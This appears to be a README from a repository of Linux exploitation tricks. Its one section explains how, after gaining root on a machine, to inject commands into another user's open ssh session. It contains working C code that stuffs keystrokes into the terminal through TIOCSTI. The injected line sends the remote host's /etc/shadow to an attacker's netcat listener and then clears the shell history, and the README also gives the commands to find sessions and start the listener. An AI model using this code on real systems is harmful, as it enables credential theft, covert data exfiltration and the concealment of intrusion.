# Linux-Trix
An assortment of techniques that can be used to exploit Linux.  Most of these assume that you have or can attain root privileges on the host.  You will need to change IP addresses and other references in the examples to fit your environment.

## Stuffing commands into an existing ssh session

**This example assumes the following**<br />
* The attacking Linux machine (A) is 192.168.1.7
* The victim Linux machine (B) is 192.168.1.5
* The remote host (C) that a user on (B) has an ssh session open to is 192.168.10.10

**You have aquired root on a target (B), check for active ssh client sessions to other remote hosts**<br />
`ps -ef | grep ssh | grep @`

Example output, you see user "bill" on "pts/1" connected to a remote host (C) as "root".<br />
`bill     18953 18855  0 08:42 pts/1    00:00:00 ssh root@192.168.10.10`

Compile the following C code on (B) as `ptshijack.c` to get /etc/shadow from (C).<br />
```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>

// gcc ptshijack.c -o ptshijack

int main() {
    int fd = open("/dev/pts/1", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    // your commands to execute go here.
    char *x = "(cat /etc/shadow | nc 192.168.1.7 4444) &\nhistory -c\nclear\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
```

**Start netcat on (A) to receive /etc/shadow from (C)**<br />
```nc -nlvp 4444```

**Execute** `ptshijack` **on (B) to send** `/etc/shadow` **from (C) to (A)**<br />
break (ctrl-c) netcat on (A) to terminate the background process on (C)<br />
